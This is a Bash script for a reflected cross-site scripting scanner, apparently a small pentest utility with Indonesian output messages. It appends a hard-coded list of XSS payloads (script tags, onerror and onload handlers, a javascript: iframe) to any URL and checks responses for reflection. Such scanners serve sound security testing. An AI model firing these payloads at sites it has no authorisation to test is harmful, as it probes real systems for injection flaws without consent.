#!/bin/bash
# XSS Scanner v2
# Author: d4nu-ghost

if [ $# -ne 1 ]; then
    echo "Usage: $0 <url>"
    echo "Example: $0 'http://target.com/index.php?q=test'"
    exit 1
fi

url=$1

# Payload list
payloads=(
    "'\"><script>alert(d4nu-ghost)</script>"
    "\"><img src=x onerror=alert(d4nu-ghost)>"
    "<svg onload=alert(d4nu-ghost)>"
    "<iframe src=javascript:alert(d4nu-ghost)>"
    "d4nu-ghost-xss"
)

echo "🚀 Mulai scanning XSS di: $url"
echo "==================================="

for payload in "${payloads[@]}"; do
    echo "[*] Testing payload: $payload"
    response=$(curl -s -L "$url$payload")

    if echo "$response" | grep -q "$payload"; then
        echo "✅ Refleksi ditemukan! --> POTENSI XSS 🎯"
    else
        echo "❌ Tidak refleksi"
    fi
    echo "-----------------------------------"
done

echo "🔍 Selesai scanning."
